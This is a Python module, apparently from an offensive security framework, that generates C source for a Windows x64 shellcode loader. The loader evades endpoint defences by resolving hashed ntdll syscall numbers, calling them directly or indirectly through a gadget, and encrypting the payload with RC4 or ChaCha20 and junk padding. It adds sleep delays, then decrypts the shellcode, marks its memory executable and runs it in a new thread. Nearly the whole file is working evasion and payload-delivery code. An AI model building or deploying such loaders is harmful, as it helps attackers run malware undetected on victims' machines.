#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Generate C source for direct Windows syscall evasion loaders (Metasploit-style)."""

from __future__ import annotations

import base64
import random
import secrets
import struct
from pathlib import Path
from typing import Optional

from core.utils.paths import framework_root

HEADERS_DIR = framework_root() / "data" / "headers" / "windows"

SYSCALL_STUBS = (
    "NtAllocateVirtualMemory",
    "NtClose",
    "NtCreateThreadEx",
    "NtOpenProcess",
    "NtProtectVirtualMemory",
    "NtWriteVirtualMemory",
)


def _rc4_crypt(key: bytes, data: bytes) -> bytes:
    state = list(range(256))
    j = 0
    for i in range(256):
        j = (j + state[i] + key[i % len(key)]) % 256
        state[i], state[j] = state[j], state[i]
    i = j = 0
    out = bytearray(len(data))
    for idx, byte in enumerate(data):
        i = (i + 1) % 256
        j = (j + state[i]) % 256
        state[i], state[j] = state[j], state[i]
        out[idx] = byte ^ state[(state[i] + state[j]) % 256]
    return bytes(out)


def _chacha20_crypt(key: bytes, nonce: bytes, data: bytes) -> bytes:
    """Encrypt with the djb ChaCha20 layout used by data/headers/*/chacha.h.

    PyCryptodome's ChaCha20 uses the IETF 12-byte nonce layout, which is not
    compatible with the embedded C decryptors — always use the djb reference.
    """
    return _chacha20_djb_encrypt(key, nonce, data)


def _chacha20_djb_encrypt(key: bytes, iv: bytes, data: bytes) -> bytes:
    def rotl32(value: int, shift: int) -> int:
        return ((value << shift) & 0xFFFFFFFF) | (value >> (32 - shift))

    def quarter_round(state, a, b, c, d):
        state[a] = (state[a] + state[b]) & 0xFFFFFFFF
        state[d] ^= state[a]
        state[d] = rotl32(state[d], 16)
        state[c] = (state[c] + state[d]) & 0xFFFFFFFF
        state[b] ^= state[c]
        state[b] = rotl32(state[b], 12)
        state[a] = (state[a] + state[b]) & 0xFFFFFFFF
        state[d] ^= state[a]
        state[d] = rotl32(state[d], 8)
        state[c] = (state[c] + state[d]) & 0xFFFFFFFF
        state[b] ^= state[c]
        state[b] = rotl32(state[b], 7)

    constants = b"expand 32-byte k"
    state = [
        int.from_bytes(constants[0:4], "little"),
        int.from_bytes(constants[4:8], "little"),
        int.from_bytes(constants[8:12], "little"),
        int.from_bytes(constants[12:16], "little"),
    ]
    state.extend(int.from_bytes(key[i : i + 4], "little") for i in range(0, 32, 4))
    state.extend([0, 0, int.from_bytes(iv[0:4], "little"), int.from_bytes(iv[4:8], "little")])

    out = bytearray()
    offset = 0
    while offset < len(data):
        working = state.copy()
        for _ in range(10):
            quarter_round(working, 0, 4, 8, 12)
            quarter_round(working, 1, 5, 9, 13)
            quarter_round(working, 2, 6, 10, 14)
            quarter_round(working, 3, 7, 11, 15)
            quarter_round(working, 0, 5, 10, 15)
            quarter_round(working, 1, 6, 11, 12)
            quarter_round(working, 2, 7, 8, 13)
            quarter_round(working, 3, 4, 9, 14)
        stream = b"".join(
            ((working[i] + state[i]) & 0xFFFFFFFF).to_bytes(4, "little") for i in range(16)
        )
        block = stream[: min(64, len(data) - offset)]
        out.extend(data[offset + i] ^ block[i] for i in range(len(block)))
        offset += len(block)
        state[12] = (state[12] + 1) & 0xFFFFFFFF
        if state[12] == 0:
            state[13] = (state[13] + 1) & 0xFFFFFFFF
    return bytes(out)


def ror8(value: int) -> int:
    value &= 0xFFFFFFFF
    return ((value >> 8) & 0xFFFFFFFF) | ((value << 24) & 0xFFFFFFFF)


def calc_syscall_hash(name: str, seed: int) -> int:
    """Hash Zw* export names the same way as Metasploit's evasion module."""
    digest = seed & 0xFFFFFFFF
    normalized = name.replace("Nt", "Zw") + "\x00"
    for index in range(len(normalized) - 1):
        chunk = normalized[index : index + 2]
        if len(chunk) < 2:
            break
        partial = struct.unpack("<H", chunk.encode("latin-1"))[0]
        digest = (digest ^ (partial + ror8(digest))) & 0xFFFFFFFF
    return digest


def _to_c_string(data: bytes, var_name: str, wrap: int = 16) -> str:
    lines = [f"unsigned char {var_name}[] ="]
    for offset in range(0, len(data), wrap):
        chunk = data[offset : offset + wrap]
        hex_part = "".join(f"\\x{b:02x}" for b in chunk)
        lines.append(f'    "{hex_part}"')
    lines[-1] += ";"
    return "\n".join(lines)


def _syscall_tail(*, indirect: bool) -> str:
    if indirect:
        return (
            "    mov r10, rcx \\n"
            "    jmp qword ptr [g_syscall_gadget] \\n"
            "    ret \\n"
        )
    return (
        "    mov r10, rcx \\n"
        "    syscall                    \\n"
        "    ret \\n"
    )


def _nt_alloc(hash_hex: str, *, indirect: bool = False) -> str:
    tail = _syscall_tail(indirect=indirect)
    return f"""
__asm__(
    "NtAllocateVirtualMemory: \\n"
    "    mov [rsp +8], rcx          \\n"
    "    mov [rsp+16], rdx\\n"
    "    mov [rsp+24], r8\\n"
    "    mov [rsp+32], r9\\n"
    "    sub rsp, 0x28\\n"
    "    mov ecx, 0x{hash_hex}        \\n"
    "    call GetSyscallNumber  \\n"
    "    add rsp, 0x28 \\n"
    "    mov rcx, [rsp +8]          \\n"
    "    mov rdx, [rsp+16] \\n"
    "    mov r8, [rsp+24] \\n"
    "    mov r9, [rsp+32] \\n"
{tail}
);
"""


def _nt_close(hash_hex: str, *, indirect: bool = False) -> str:
    tail = _syscall_tail(indirect=indirect)
    return f"""
__asm__(
    "NtClose: \\n"
    "    mov [rsp +8], rcx       \\n"
    "    mov [rsp+16], rdx \\n"
    "    mov [rsp+24], r8 \\n"
    "    mov [rsp+32], r9 \\n"
    "    sub rsp, 0x28 \\n"
    "    mov ecx, 0x{hash_hex}      \\n"
    "    call GetSyscallNumber  \\n"
    "    add rsp, 0x28 \\n"
    "    mov rcx, [rsp +8]          \\n"
    "    mov rdx, [rsp+16] \\n"
    "    mov r8, [rsp+24] \\n"
    "    mov r9, [rsp+32] \\n"
{tail}
);
"""


def _nt_create_thread(hash_hex: str, *, indirect: bool = False) -> str:
    tail = _syscall_tail(indirect=indirect)
    return f"""
__asm__(
    "NtCreateThreadEx: \\n"
    "    mov [rsp +8], rcx          \\n"
    "    mov [rsp+16], rdx\\n"
    "    mov [rsp+24], r8\\n"
    "    mov [rsp+32], r9\\n"
    "    sub rsp, 0x28\\n"
    "    mov ecx, 0x{hash_hex}        \\n"
    "    call GetSyscallNumber  \\n"
    "    add rsp, 0x28\\n"
    "    mov rcx, [rsp +8]          \\n"
    "    mov rdx, [rsp+16]\\n"
    "    mov r8, [rsp+24]\\n"
    "    mov r9, [rsp+32]\\n"
{tail}
);
"""


def _nt_open_process(hash_hex: str, *, indirect: bool = False) -> str:
    tail = _syscall_tail(indirect=indirect)
    return f"""
__asm__(
    "NtOpenProcess: \\n"
    "    mov [rsp +8], rcx           \\n"
    "    mov [rsp+16], rdx \\n"
    "    mov [rsp+24], r8 \\n"
    "    mov [rsp+32], r9 \\n"
    "    sub rsp, 0x28 \\n"
    "    mov ecx, 0x{hash_hex}        \\n"
    "    call GetSyscallNumber  \\n"
    "    add rsp, 0x28 \\n"
    "    mov rcx, [rsp +8]         \\n"
    "    mov rdx, [rsp+16] \\n"
    "    mov r8, [rsp+24] \\n"
    "    mov r9, [rsp+32] \\n"
{tail}
);
"""


def _nt_protect(hash_hex: str, *, indirect: bool = False) -> str:
    if indirect:
        tail = (
            "mov r10, rcx \\n"
            "jmp qword ptr [g_syscall_gadget] \\n"
            "ret \\n"
        )
    else:
        tail = (
            "mov r10, rcx \\n"
            "syscall           \\n"
            "ret \\n"
        )
    return f"""
__asm__(
    "NtProtectVirtualMemory: \\n"
    "push rcx \\n"
    "push rdx \\n"
    "push r8 \\n"
    "push r9 \\n"
    "mov ecx, 0x{hash_hex} \\n"
    "call GetSyscallNumber  \\n"
    "pop r9  \\n"
    "pop r8 \\n"
    "pop rdx \\n"
    "pop rcx \\n"
    "{tail}"
);
"""


def _nt_write(hash_hex: str, *, indirect: bool = False) -> str:
    tail = _syscall_tail(indirect=indirect)
    return f"""
__asm__(
    "NtWriteVirtualMemory: \\n"
    "    mov [rsp +8], rcx          \\n"
    "    mov [rsp+16], rdx \\n"
    "    mov [rsp+24], r8 \\n"
    "    mov [rsp+32], r9 \\n"
    "    sub rsp, 0x28 \\n"
    "    mov ecx, 0x{hash_hex}        \\n"
    "    call GetSyscallNumber  \\n"
    "    add rsp, 0x28 \\n"
    "    mov rcx, [rsp +8]          \\n"
    "    mov rdx, [rsp+16] \\n"
    "    mov r8, [rsp+24] \\n"
    "    mov r9, [rsp+32] \\n"
{tail}
);
"""


DEFINES = """
#define _ROR8(v) (v >> 8 | v << 24)
#define MAX_SYSCALLS 500
#define _RVA2VA(Type, DllBase, Rva) (Type)((ULONG_PTR) DllBase + Rva)

typedef struct _SYSCALL_ENTRY
{
    DWORD Hash;
    DWORD Address;
} SYSCALL_ENTRY, *P_SYSCALL_ENTRY;

typedef struct _SYSCALL_LIST
{
    DWORD Count;
    SYSCALL_ENTRY Entries[MAX_SYSCALLS];
} SYSCALL_LIST, *P_SYSCALL_LIST;

typedef struct _PEB_LDR_DATA {
    BYTE Reserved1[8];
    PVOID Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *P_PEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    PVOID Reserved1[2];
    LIST_ENTRY InMemoryOrderLinks;
    PVOID Reserved2[2];
    PVOID DllBase;
} LDR_DATA_TABLE_ENTRY, *P_LDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    P_PEB_LDR_DATA Ldr;
} PEB, *P_PEB;

typedef struct _PS_ATTRIBUTE
{
    ULONG  Attribute;
    SIZE_T Size;
    union
    {
        ULONG Value;
        PVOID ValuePtr;
    } u1;
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES
{
    ULONG           Length;
    HANDLE          RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG           Attributes;
    PVOID           SecurityDescriptor;
    PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID
{
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T       TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

EXTERN_C NTSTATUS NtAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID * BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect);

EXTERN_C NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID * BaseAddress,
    IN OUT PSIZE_T RegionSize,
    IN ULONG NewProtect,
    OUT PULONG OldProtect);

EXTERN_C NTSTATUS NtCreateThreadEx(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);

EXTERN_C NTSTATUS NtWriteVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN SIZE_T NumberOfBytesToWrite,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL);

EXTERN_C NTSTATUS NtOpenProcess(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PCLIENT_ID ClientId OPTIONAL);

EXTERN_C NTSTATUS NtClose(
    IN HANDLE Handle);
"""


SYSCALL_PARSER = """
SYSCALL_LIST _SyscallList;
PVOID g_syscall_gadget = NULL;

DWORD HashSyscall(PCSTR FunctionName)
{
    DWORD i = 0;
    DWORD Hash = _SEED;

    while (FunctionName[i])
    {
        WORD PartialName = *(WORD*)((ULONG64)FunctionName + i++);
        Hash ^= PartialName + _ROR8(Hash);
    }

    return Hash;
}

BOOL FindSyscallGadget(PVOID DllBase, PIMAGE_EXPORT_DIRECTORY ExportDirectory)
{
    if (g_syscall_gadget) return TRUE;

    PDWORD Functions = _RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
    PDWORD Names = _RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
    PWORD Ordinals = _RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);
    DWORD NumberOfNames = ExportDirectory->NumberOfNames;

    while (NumberOfNames--)
    {
        PCHAR FunctionName = _RVA2VA(PCHAR, DllBase, Names[NumberOfNames]);
        if (*(USHORT*)FunctionName != *(USHORT*)"Zw")
            continue;

        PVOID Stub = _RVA2VA(PVOID, DllBase, Functions[Ordinals[NumberOfNames]]);
        for (DWORD i = 0; i < 32; i++)
        {
            PBYTE Cursor = (PBYTE)Stub + i;
            if (Cursor[0] == 0x0F && Cursor[1] == 0x05)
            {
                g_syscall_gadget = (PVOID)Cursor;
                return TRUE;
            }
        }
    }

    return FALSE;
}

BOOL PopulateSyscallList()
{
    if (_SyscallList.Count) return TRUE;

    P_PEB Peb = (P_PEB)__readgsqword(0x60);
    P_PEB_LDR_DATA Ldr = Peb->Ldr;
    PIMAGE_EXPORT_DIRECTORY ExportDirectory = NULL;
    PVOID DllBase = NULL;

    P_LDR_DATA_TABLE_ENTRY LdrEntry;
    for (LdrEntry = (P_LDR_DATA_TABLE_ENTRY)Ldr->Reserved2[1]; LdrEntry->DllBase != NULL; LdrEntry = (P_LDR_DATA_TABLE_ENTRY)LdrEntry->Reserved1[0])
    {
        DllBase = LdrEntry->DllBase;
        PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)DllBase;
        PIMAGE_NT_HEADERS NtHeaders = _RVA2VA(PIMAGE_NT_HEADERS, DllBase, DosHeader->e_lfanew);
        PIMAGE_DATA_DIRECTORY DataDirectory = (PIMAGE_DATA_DIRECTORY)NtHeaders->OptionalHeader.DataDirectory;
        DWORD VirtualAddress = DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (VirtualAddress == 0) continue;

        ExportDirectory = (PIMAGE_EXPORT_DIRECTORY)_RVA2VA(ULONG_PTR, DllBase, VirtualAddress);

        PCHAR DllName = _RVA2VA(PCHAR, DllBase, ExportDirectory->Name);

        if ((*(ULONG*)DllName | 0x20202020) != *(ULONG*)"ntdl") continue;
        if ((*(ULONG*)(DllName + 4) | 0x20202020) == *(ULONG*)"l.dl") break;
    }

    if (!ExportDirectory) return FALSE;

    DWORD NumberOfNames = ExportDirectory->NumberOfNames;
    PDWORD Functions = _RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfFunctions);
    PDWORD Names = _RVA2VA(PDWORD, DllBase, ExportDirectory->AddressOfNames);
    PWORD Ordinals = _RVA2VA(PWORD, DllBase, ExportDirectory->AddressOfNameOrdinals);

    DWORD i = 0;
    P_SYSCALL_ENTRY Entries = _SyscallList.Entries;
    do
    {
        PCHAR FunctionName = _RVA2VA(PCHAR, DllBase, Names[NumberOfNames - 1]);

        if (*(USHORT*)FunctionName == *(USHORT*)"Zw")
        {
            Entries[i].Hash = HashSyscall(FunctionName);
            Entries[i].Address = Functions[Ordinals[NumberOfNames - 1]];

            i++;
            if (i == MAX_SYSCALLS) break;
        }
    } while (--NumberOfNames);

    _SyscallList.Count = i;

    if (!FindSyscallGadget(DllBase, ExportDirectory))
        return FALSE;

    for (DWORD i = 0; i < _SyscallList.Count - 1; i++)
    {
        for (DWORD j = 0; j < _SyscallList.Count - i - 1; j++)
        {
            if (Entries[j].Address > Entries[j + 1].Address)
            {
                SYSCALL_ENTRY TempEntry;

                TempEntry.Hash = Entries[j].Hash;
                TempEntry.Address = Entries[j].Address;

                Entries[j].Hash = Entries[j + 1].Hash;
                Entries[j].Address = Entries[j + 1].Address;

                Entries[j + 1].Hash = TempEntry.Hash;
                Entries[j + 1].Address = TempEntry.Address;
            }
        }
    }

    return TRUE;
}

extern DWORD GetSyscallNumber(DWORD FunctionHash)
{
    if (!PopulateSyscallList()) return -1;
    for (DWORD i = 0; i < _SyscallList.Count; i++)
    {
        if (FunctionHash == _SyscallList.Entries[i].Hash)
        {
            return i;
        }
    }
    return -1;
}
"""


class SyscallEvasionBuilder:
    """Build C source for a direct- or indirect-syscall Windows x64 loader."""

    def __init__(
        self,
        *,
        seed: Optional[int] = None,
        cipher: str = "chacha",
        sleep_ms: int = 20000,
        indirect: bool = False,
    ) -> None:
        self.seed = seed if seed is not None else random.randint(2**28, 2**32 - 1)
        self.cipher = cipher.lower()
        self.sleep_ms = max(0, int(sleep_ms))
        self.indirect = bool(indirect)
        if self.cipher not in {"chacha", "rc4"}:
            raise ValueError("cipher must be 'chacha' or 'rc4'")

    def encrypt_payload(self, payload: bytes) -> tuple[str, bytes, Optional[bytes]]:
        junk_size = random.randint(10, 1024)
        padded = payload + secrets.token_bytes(junk_size)

        if self.cipher == "rc4":
            key = secrets.token_bytes(random.randint(32, 64))
            encrypted = _rc4_crypt(key, padded)
            encoded = base64.b64encode(encrypted).decode("ascii")
            return encoded, key, None

        key = secrets.token_bytes(32)
        iv = secrets.token_bytes(8)
        encrypted = _chacha20_crypt(key, iv, padded)
        encoded = base64.b64encode(encrypted).decode("ascii")
        return encoded, key, iv

    def build_source(self, encoded_payload: str, key: bytes, iv: Optional[bytes] = None) -> str:
        headers = ['#include <windows.h>', '#include "base64.h"']
        if self.cipher == "rc4":
            headers.append('#include "rc4.h"')
        else:
            headers.append('#include "chacha.h"')

        parts = [
            "\n".join(headers),
            f"#define _SEED 0x{self.seed:x}",
            DEFINES,
        ]

        for stub in SYSCALL_STUBS:
            digest = f"{calc_syscall_hash(stub, self.seed):x}"
            kwargs = {"indirect": self.indirect}
            if stub == "NtAllocateVirtualMemory":
                parts.append(_nt_alloc(digest, **kwargs))
            elif stub == "NtClose":
                parts.append(_nt_close(digest, **kwargs))
            elif stub == "NtCreateThreadEx":
                parts.append(_nt_create_thread(digest, **kwargs))
            elif stub == "NtOpenProcess":
                parts.append(_nt_open_process(digest, **kwargs))
            elif stub == "NtProtectVirtualMemory":
                parts.append(_nt_protect(digest, **kwargs))
            elif stub == "NtWriteVirtualMemory":
                parts.append(_nt_write(digest, **kwargs))

        parts.append(SYSCALL_PARSER)
        parts.append(
            f"""
char* enc_shellcode = "{encoded_payload}";
DWORD exec(void *buffer)
{{
    void (*function)();
    function = (void (*)())buffer;
    function();
    return 0;
}}
"""
        )

        sleep_block = ""
        if self.sleep_ms > 0:
            sleep_block = f"for (int i = 0; i < 10; i++) {{ Sleep({self.sleep_ms} / 10); }}"

        decrypt_block = ""
        if self.cipher == "rc4":
            decrypt_block = f"""
            {_to_c_string(key, "key")}
            RC4(key, shellcode, temp, size);
            NtWriteVirtualMemory(pHandle, bAddress, temp, size, NULL);
"""
        else:
            if iv is None:
                raise ValueError("iv is required for chacha cipher")
            decrypt_block = f"""
            {_to_c_string(key, "key")}
            {_to_c_string(iv, "iv")}
            chacha_ctx ctx;
            chacha_keysetup(&ctx, key, 256, 96);
            chacha_ivsetup(&ctx, iv);
            chacha_encrypt_bytes(&ctx, shellcode, temp, size);
            NtWriteVirtualMemory(pHandle, bAddress, temp, size, NULL);
"""

        parts.append(
            f"""
void inject()
{{
    HANDLE pHandle;
    DWORD old = 0;
    CLIENT_ID cID = {{0}};
    OBJECT_ATTRIBUTES OA = {{0}};
    int b64len = (int)strlen(enc_shellcode);
    PBYTE shellcode = (PBYTE)malloc(b64len);
    SIZE_T size = base64decode(shellcode, enc_shellcode, b64len);
    PVOID bAddress = NULL;
    cID.UniqueProcess = ULongToHandle(GetCurrentProcessId());
    NtOpenProcess(&pHandle, PROCESS_ALL_ACCESS, &OA, &cID);
    NtAllocateVirtualMemory(pHandle, &bAddress, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    PBYTE temp = (PBYTE)malloc(size);
{decrypt_block}
    NtProtectVirtualMemory(pHandle, &bAddress, &size, PAGE_EXECUTE, &old);
    {sleep_block}
    HANDLE thread = NULL;
    NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, NULL, pHandle, exec, bAddress, 0, 0, 0, 0, NULL);
    WaitForSingleObject(thread, INFINITE);
    NtClose(thread);
    NtClose(pHandle);
}}

int main()
{{
    inject();
    return 0;
}}
"""
        )
        return "\n".join(parts)

    @staticmethod
    def headers_directory() -> Path:
        return HEADERS_DIR
